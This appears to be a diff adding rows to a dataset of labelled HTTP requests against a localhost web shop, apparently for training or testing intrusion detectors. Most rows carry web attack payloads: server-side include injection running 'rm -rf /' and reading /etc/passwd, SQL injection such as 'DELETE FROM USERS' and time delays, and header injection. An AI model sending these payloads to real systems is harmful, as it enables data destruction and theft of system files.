+7355,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+6981,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+15807,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+15372,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+15512,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+9688,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+6803,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=3858&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+6780,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=9468&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+1162,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+22764,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6525&B1=Pasar+por+caja%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+17601,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+14766,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+12659,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+8175,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&precio=3845&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+23446,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+21762,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+24150,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+10866,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=622&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+3527,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3212%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+15584,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6987%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+13865,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27+DELETE+FROM+USERS&precio=4981&B1=Confirmar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+24314,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9611&B1=Confirmar%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+11324,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+17841,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5698&B1=Pasar+por+caja%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+20695,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8792&B1=Pasar+por+cajaany%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+13339,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+6770,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+17158,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+23503,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8409&B1=Pasar+por+cajaany%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+10995,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+20954,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+10718,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+13820,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+4180,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+3053,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+18706,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+23666,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+5181,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+19292,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+17932,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+22243,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+22533,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+15660,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&nombre=Queso+Manchego&precio=85&cantidad=63&B1=A%F1adir+al+carrito HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+22003,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+13269,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+1654,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&nombre=Queso+Manchego&precio=85&cantidad=90&B1=A%F1adir+al+carrito HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+13050,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+23039,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=622%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
